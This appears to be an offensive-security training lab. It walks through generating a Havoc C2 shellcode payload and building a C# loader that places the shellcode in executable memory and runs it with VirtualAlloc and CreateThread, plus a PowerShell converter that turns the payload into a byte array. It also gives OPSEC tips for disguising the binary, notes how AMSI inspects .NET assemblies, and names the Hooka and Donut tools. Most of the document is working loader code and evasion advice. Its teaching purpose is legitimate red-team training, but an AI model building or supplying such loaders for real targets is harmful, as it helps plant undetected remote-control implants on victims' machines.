# Lab - Shellcode


> OPSEC HINT : Let's apply some basic best practices when we compile the following code
> 1. add and icon file to the dotnet app.
> 2. add metadata
> 4. Remove comments
> 3. compile with CSC

When compiling the dotnet code you can specify the .net version
```powershell

```

We'll need the .Net Developer Pack 4.8, let's see if it is installed:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version
```

CSC.exe is located in "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"


>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.

Let's generate a Havoc shellcode payload (on `KALI` using the Havoc GUI):

Screenshots + xxd (hexview) payload.

Switch to your windows and under `"C:\THEV\Labs\LocalLoader"` you'll find a csharp solution file - open that with Visual Studio 2022.

We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).

```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // (1) insert our shellcode
            byte[] shellCode = new byte[] { /* insert shellcode here */ };

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory
            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

----
Here's a small shellcode formatter toos in powershell, it converts a binary file to csharp:

```powershell
$fileName = "C:\temp\demon.x64.bin"
$fileContent = [IO.File]::ReadAllBytes($fileName)
#$fileContent
$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
Write-Output "[+] Shellcode length: $($csharpformat.Length) bytes"
$csharpformat | add-content ($fileName + ".cs")
Write-Output "[+] CSharp Shellcode written to: $filename"
```

---
Hooka

Donut